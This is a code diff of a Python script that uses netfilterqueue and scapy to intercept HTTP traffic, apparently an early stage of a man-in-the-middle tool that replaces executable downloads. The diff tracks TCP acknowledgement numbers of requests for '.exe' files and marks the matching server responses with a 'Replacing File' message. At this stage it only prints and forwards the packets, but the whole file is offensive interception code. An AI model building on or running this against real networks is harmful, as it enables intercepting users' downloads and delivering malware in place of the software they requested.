@@ -5,18 +5,23 @@
 import netfilterqueue
 import scapy.all as scapy
 
+ack_list=[]  
+
 def process_packet(packet):
     scapy_packet = scapy.IP(packet.get_payload())   #converting into scapy packet
     if scapy_packet.haslayer(scapy.Raw):   #checking for HTTP layer
 
        if scapy_packet[scapy.TCP].dport == 80:  #HTTP requests
+          
           if ".exe" in scapy_packet[scapy.Raw].load:
-             print("[+]exe Request")          
+             print("[+]exe Request")
+             ack_list.append(scapy_packet[scapy.TCP].ack)          
              print("scapy_packet.show()")
 
        elif scapy_packet[scapy.TCP].sport == 80:   #HTTP responses
-            print("HTTP responses")
-            print(scapy_packet.show())
+            if scapy_packet[scapy.TCP].seq in ack_list:
+               print("[+]Replacing File")
+               print(scapy_packet.show())
 
 
     packet.accept()  #to forward the packets
